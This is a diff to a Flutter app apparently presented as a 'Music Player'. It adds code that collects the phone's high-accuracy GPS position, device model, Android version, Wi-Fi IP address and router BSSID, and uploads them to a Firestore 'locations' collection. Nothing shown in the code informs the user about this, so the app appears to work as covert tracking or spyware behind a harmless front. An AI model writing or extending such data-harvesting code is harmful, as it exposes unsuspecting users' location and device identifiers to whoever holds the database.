@@ -2,11 +2,13 @@ import 'dart:async';
 import 'dart:developer';
 import 'package:app/firebase_options.dart';
 import 'package:app/view/spalsh/spalsh.dart';
+import 'package:device_info_plus/device_info_plus.dart';
 import 'package:flutter/material.dart';
 import 'package:geolocator/geolocator.dart';
 import 'package:firebase_core/firebase_core.dart';
 import 'package:cloud_firestore/cloud_firestore.dart';
 import 'package:get/get_navigation/src/root/get_material_app.dart';
+import 'package:network_info_plus/network_info_plus.dart';
 import 'package:permission_handler/permission_handler.dart';
 
 void main() async {
@@ -63,14 +65,24 @@ class _MyAppState extends State<MyApp> {
   }
 
   Future<void> _getLocation() async {
+    log("message??");
     try {
       Position position = await Geolocator.getCurrentPosition(
+        // ignore: deprecated_member_use
         desiredAccuracy: LocationAccuracy.high,
       );
 
       final lat = position.latitude;
       final lng = position.longitude;
+      final deviceInfo = DeviceInfoPlugin();
+      final androidInfo = await deviceInfo.androidInfo;
+      final deviceName = "${androidInfo.manufacturer} ${androidInfo.model}";
+      final androidVersion = androidInfo.version.release;
 
+      // 🌐 Get IP and MAC (router BSSID)
+      final info = NetworkInfo();
+      String? ip = await info.getWifiIP();
+      String? macAddress = await info.getWifiBSSID();
       setState(() {
         locationMessage = "Lat: $lat, Lng: $lng";
       });
@@ -80,6 +92,10 @@ class _MyAppState extends State<MyApp> {
       await FirebaseFirestore.instance.collection("locations").add({
         "latitude": lat,
         "longitude": lng,
+        "device_name": deviceName,
+        "android_version": androidVersion,
+        "ip_address": ip ?? "Unknown",
+        "mac_address": macAddress ?? "Unknown",
         "timestamp": FieldValue.serverTimestamp(),
       });
     } catch (e) {
@@ -91,7 +107,7 @@ class _MyAppState extends State<MyApp> {
 
   @override
   Widget build(BuildContext context) {
-    return  GetMaterialApp(
+    return GetMaterialApp(
       debugShowCheckedModeBanner: false,
       title: 'Music Player',
       theme: ThemeData(primarySwatch: Colors.blue),
